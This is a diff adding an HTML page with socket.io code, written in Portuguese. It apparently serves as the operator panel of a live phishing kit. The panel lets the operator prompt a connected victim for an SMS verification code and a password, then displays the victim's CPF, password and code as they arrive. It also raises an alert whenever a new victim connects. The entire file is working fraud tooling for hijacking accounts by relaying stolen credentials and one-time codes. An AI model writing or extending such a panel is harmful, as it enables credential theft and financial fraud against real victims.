@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+    <title>Document</title>
+</head>
+<body>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="//code.jquery.com/jquery-3.2.1.min.js"></script>
+    <script>
+        const socket = io();
+
+        
+        function minhafuncao(){
+            
+            var final = document.getElementById('final').value;
+            
+            socket.emit("pedirsms", "pedirsms")
+            socket.emit("final", final)
+            var aguardando = document.getElementById('solicitado').innerHTML = "CODIGO SMS SOLICITADO";
+            var aguardando2 = document.getElementById('aguardando').innerHTML = "";
+            
+      
+        }
+
+        function minhafuncao2(){            
+            socket.emit("pedirsenha", "pedirsenha")
+      
+        }
+
+        socket.on("enviarcpf", valor =>{
+            var enviarcpf = document.getElementById('enviarcpf').innerHTML = valor;
+
+
+        })
+
+        socket.on("usuarionovo", data =>{
+
+            if(data !== (socket.id)){
+                var laranja =  document.getElementById('laranja');
+                laranja.style.display = "block"
+
+            }
+
+                
+
+
+
+        })
+
+        socket.on("enviarcodigo", valor =>{
+            var enviarcodigo = document.getElementById('enviarcodigo').innerHTML = valor
+            var aguardando = document.getElementById('yellow').innerHTML = "CODIGO SMS RECEBIDO"
+
+
+
+        })
+
+        socket.on("enviarsenha", valor =>{
+            var enviarcpf = document.getElementById('enviarsenha').innerHTML = valor;
+            var aguardando = document.getElementById('aguardando').innerHTML = "USUÁRIO AGUARDANDO LIBERAÇÃO DA TELA!";
+
+
+        })
+
+        
+    </script>
+
+    
+
+    <input type="text" id="final" placeholder="digite o final do celular">
+    <button onclick="minhafuncao()" type="submit">PEDIR SMS</button>
+    <button onclick="minhafuncao2()" type="submit">PEDIR SENHA</button>
+    <p>CPF: <strong id="enviarcpf"><strong></p>
+    <p>SENHA: <strong id="enviarsenha"><strong></p>
+
+        <p>SMS: <strong id="enviarcodigo"></strong></u></p>
+
+        <p style="background-color: red;color:aliceblue; text-align:center;" id="aguardando"></p>
+        <p style="background-color: green;color:aliceblue; text-align:center;" id="solicitado"></p>
+        <p style="background-color: yellow;color:aliceblue; text-align:center;color:black;" id="yellow"></p>
+    
+        <div id="laranja" style="width: 100vw;height: 100px;background-color: orangered;margin-top: 100px;display: none;">
+            <H1 style="font-size:25pt; color: lawngreen; text-align: center;">USUARIO CONECTADO</H1>
+        </div>
+</body>
+</html>
